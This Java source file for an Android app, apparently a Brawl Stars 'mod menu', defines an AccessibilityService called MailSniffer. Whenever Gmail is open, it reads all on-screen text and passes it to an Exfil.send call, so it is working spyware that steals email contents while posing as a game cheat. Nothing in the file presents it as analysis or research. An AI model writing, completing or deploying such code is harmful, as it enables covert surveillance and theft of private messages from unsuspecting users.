package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class MailSniffer extends AccessibilityService {

    private long lastSend = 0;
    private static final long COOLDOWN = 3000;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        if (!"com.google.android.gm".contentEquals(pkgCs)) return;

        if (System.currentTimeMillis() - lastSend < COOLDOWN) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        StringBuilder sb = new StringBuilder();
        walk(root, sb, 0);

        String dump = sb.toString().trim();
        if (dump.length() > 40) {
            Exfil.send("GMAIL_VIEW", dump);
            lastSend = System.currentTimeMillis();
        }
    }

    private void walk(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
        if (n == null || depth > 25) return;
        CharSequence t = n.getText();
        CharSequence d = n.getContentDescription();
        if (t != null && t.length() > 0) sb.append(t).append("\n");
        else if (d != null && d.length() > 0) sb.append(d).append("\n");
        for (int i = 0; i < n.getChildCount(); i++) {
            walk(n.getChild(i), sb, depth + 1);
        }
    }

    @Override public void onInterrupt() {}
}
